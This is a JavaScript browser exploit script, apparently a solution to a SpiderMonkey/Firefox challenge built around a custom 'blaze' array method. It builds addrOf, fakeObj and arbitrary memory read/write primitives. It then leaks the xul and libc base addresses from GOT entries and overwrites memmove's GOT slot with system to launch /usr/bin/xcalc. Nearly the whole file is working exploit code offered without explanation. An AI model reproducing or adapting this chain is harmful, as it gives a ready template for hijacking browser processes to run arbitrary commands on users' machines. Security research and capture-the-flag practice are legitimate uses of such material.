/*
 * load("utils.js");
 * load("int64.js");
 */

var LENGTH_OFFSET = 11;
var DATA_SLOT_OFFSET = 13; 

function addrOf(o) {
    a[DATA_SLOT_OFFSET+1] = o;
    return Int64.fromJSValue(b.slice(0, 8))
}

function fakeObj(addr) {
    let values = new Int64(addr).bytes();
    b.set(values);
    return a[DATA_SLOT_OFFSET+1];
}

function readData(addr) {
    let bak = a[DATA_SLOT_OFFSET];
    a[DATA_SLOT_OFFSET] = addr.asDouble();
    let data = Int64.fromJSValue(b.slice(0, 8))
    a[DATA_SLOT_OFFSET] = bak;
    return data;
}

function read(addr, length) {
    let bak = a[DATA_SLOT_OFFSET];
    a[DATA_SLOT_OFFSET] = addr.asDouble();
    let data = b.slice(0, length);
    a[DATA_SLOT_OFFSET] = bak;
    return data;
}

function writeData(addr, data) {
    let bak = a[DATA_SLOT_OFFSET];
    a[DATA_SLOT_OFFSET] = addr.asDouble();
    let values = new Int64(data).bytes();
    b.set(values);
    a[DATA_SLOT_OFFSET] = bak;
}

var a = new Array(1, 2, 3, 4, 5, 6);
var b = new Uint8Array(0x30);
console.log("[*] executing blaze");
a.blaze();

var dateAddr = addrOf(Date.now);
var dateAddr = readData(Add(dateAddr,  0x28));
console.log("[+] Date.now @", dateAddr.toString());

var xulBase = Sub(dateAddr, 0x049c7ab0);
//var xulBase = Sub(dateAddr, 0x0829830);
console.log("[+] xul @", xulBase.toString());
console.log(readData(xulBase).bytes());
var gotOffset = 0x08188c58
//var gotOffset = 0x01ece7f0

var memmoveGot = Add(xulBase, gotOffset + (1209 * 8));
//var memmoveGot = Add(xulBase, gotOffset + (613 * 8));
console.log("[+] memmove@got @", memmoveGot.toString());
var memmoveLibc = readData(memmoveGot);
console.log("[+] memmove @", memmoveLibc.toString());

var dupGot = Add(xulBase, gotOffset + (1372 * 8));
console.log("[+] dup@got @", dupGot.toString());
var dupLibc = readData(dupGot);
console.log("[+] dup @", dupLibc.toString());
var libcBase = Sub(dupLibc, 0x111a00);

var putsGot = Add(xulBase, gotOffset + (608 * 8));
var putsLibc = readData(putsGot);
//var libcBase = Sub(putsLibc, 0x875a0);
console.log("[+] puts @", putsLibc.toString());
console.log("[+] libc @", libcBase.toString());
console.log(readData(libcBase).bytes());
var system = Add(libcBase, 0x55410);
console.log("[+] system @", system.toString());

var target = new Uint8Array(100);
var cmd = "/usr/bin/xcalc";

for (var i = 0; i < cmd.length; i++) {
    target[i] = cmd.charCodeAt(i);
}
target[cmd.length] = 0;

var memmoveBak = readData(memmoveGot);
console.log("[+] memmove @", memmoveBak.toString());
writeData(memmoveGot, system);
target.copyWithin(0, 1);
writeData(memmoveGot, memmoveBak.bytes());

console.log("[*] Done");
